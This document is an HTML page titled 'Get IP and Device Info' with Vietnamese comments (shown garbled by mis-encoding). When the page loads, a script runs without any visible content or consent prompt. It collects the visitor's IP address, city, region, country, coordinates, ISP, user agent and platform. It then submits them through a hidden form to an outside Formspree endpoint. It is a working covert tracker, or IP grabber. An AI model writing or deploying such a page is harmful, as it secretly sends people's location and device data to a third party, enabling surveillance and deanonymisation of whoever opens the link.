<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Get IP and Device Info</title>
</head>
<body>
  <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
    <input type="hidden" name="ip_info" id="ipInfo">
  </form>

  <script>
    async function getInfo() {
      try {
        // G·ªçi song song c·∫£ hai API
        const [ipRes, geoRes] = await Promise.all([
          fetch('https://api.ipify.org?format=json'), // Ch·∫Øc ch·∫Øn ho·∫°t ƒë·ªông
          fetch('https://ipapi.co/json/')             // C√≥ th·ªÉ fail, nh∆∞ng ta th·ª≠
        ]);

        const ipData = await ipRes.json();
        const geoData = await geoRes.ok ? await geoRes.json() : {};

        // L·∫•y th√¥ng tin
        const ip = ipData.ip || 'Unknown';
        const city = geoData.city || 'Unknown';
        const region = geoData.region || 'Unknown';
        const country = geoData.country_name || 'Unknown';
        const lat = geoData.latitude || 'Unknown';
        const lon = geoData.longitude || 'Unknown';
        const isp = geoData.org || 'Unknown';
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        const now = new Date().toLocaleString();

        // So·∫°n n·ªôi dung g·ª≠i ‚Äì IP ·ªü ƒë·∫ßu r√µ r√†ng
        const content = `
üîê IP Address: ${ip}

üìç Location:
- City: ${city}
- Region: ${region}
- Country: ${country}
- Latitude: ${lat}
- Longitude: ${lon}
- ISP: ${isp}

üíª Device:
- Platform: ${platform}
- User-Agent: ${ua}

üïí Time: ${now}
        `.trim();

        // G√°n v√†o form v√† g·ª≠i
        document.getElementById('ipInfo').value = content;
        document.getElementById('ipForm').submit();
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    }

    getInfo();
  </script>
</body>
</html>
